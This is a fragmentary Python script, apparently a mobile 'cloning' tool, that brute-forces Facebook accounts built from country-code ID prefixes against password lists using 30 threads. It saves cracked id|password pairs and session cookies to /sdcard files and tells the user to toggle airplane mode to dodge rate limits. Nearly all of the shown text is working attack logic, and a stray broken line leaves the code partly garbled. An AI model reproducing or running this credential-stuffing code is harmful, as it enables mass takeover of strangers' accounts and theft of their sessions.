...
def pak():
                ...
                with tred(max_workers=30) as SWN:     
                        clear()
                        tl = str(len(user))
...
def afgan():
                ...
                with tred(max_workers=30) as SWN:     
                        ...
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;32m Brute has been started  ')
                        print(f'\033[1;32m Use airplane mode ON OFF for speed up ')
                        linex()
                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/AJX-OK.TXT")
                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/AJX-CP.TXT")
                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/AJX-COOKIE.TXT")
...
def india():
                ...
                with tred(max_workers=30) as SWN:     
                        ...
                        print(' Total  ids : \033[1;32m'+tl)
                        print(f'\033[1;32m Brute has been started  ')
                        print(f'\033[1;32m Use airplane mode on off for cloning speed fast ')
for speed up ')
                        linex()
                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/SWN-OK.TXT")
                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/SWN-CP.TXT")
                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/SWN-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [RAKIB] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                        ...
                        if "c_user" in AJX:
                                print('\r\r\033[1;32m [RAKIB-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                print("Cookie: "+coki)
                                open('/sdcard/SAWON-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/SAWON-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AJX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RAKIB-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RAKIB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAKIB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [SAWON-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAWON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [SWN] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("Cookie: "+coki)
                                        open('/sdcard/RAKIB-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SAWON-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/sawon-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
